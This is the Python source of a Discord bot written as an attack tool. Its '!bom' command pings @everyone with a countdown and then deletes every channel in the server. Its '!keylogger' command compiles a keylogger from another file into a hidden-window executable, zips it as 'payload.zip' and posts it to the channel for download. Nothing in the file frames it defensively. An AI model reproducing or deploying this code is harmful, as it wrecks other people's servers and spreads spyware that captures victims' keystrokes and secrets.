import discord
from discord.ext import commands
import requests
import zipfile
from time import sleep
from os import system, remove
from discord import Permissions

token = "BOT TOKEN"
webhookforlogs = "WEBHOOK"
intents = discord.Intents.default()
intents.message_content = True


intents = discord.Intents.all()
intents.guilds = True
intents.messages = True
intents.message_content = True
permissions = discord.Permissions()
permissions.manage_channels = True
permissions.manage_messages = True
intents.members = True
permissions = Permissions()
permissions.administrator = True


bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    print("IM READY")


@bot.command(name="bom")
async def patla(ctx):
    guild = ctx.guild
    channels = guild.channels
    channel = ctx.channel
    msg = '```WE ARE GONNA EXPLODE...@everyone```'

    await channel.send(msg)
    await channel.send("```1...@everyone```")
    sleep(1)
    await channel.send("```2...@everyone```")
    sleep(1)
    await channel.send("```3...@everyone```")
    sleep(1)
    await channel.send("```BYBY...@everyone```")

    for channel in channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f'Hata: {e}')


@bot.command(name="keylogger")
async def payload(ctx):
    await ctx.channel.send("```Preparing...It can take few minutes.```")
    with open("codes.py", "rb") as c:
        codes = c.read()
    with open("keylogger.py", "wb") as f:
        f.write(codes)
        sleep(3)

    system("pyinstaller --windowed --onefile keylogger.py")
    sleep(10)
    with zipfile.ZipFile("payload.zip", "w") as zip:
        zip.write("\\dist\\keylogger.exe")#Configure the keylogger.exe file

    with open("payload.zip", "rb") as zip_file:
        file = "payload.zip"
        payload = discord.File(file, filename="payload.zip")
        await ctx.channel.send("enjoy", file=payload)

        sleep(6)

    remove("payload.zip")
    remove("\\dist\keylogger.py")#Configure the keylogger.exe file
    remove("\\build")#Configure the build folder
    remove("keyloger.spec")

bot.run(token)
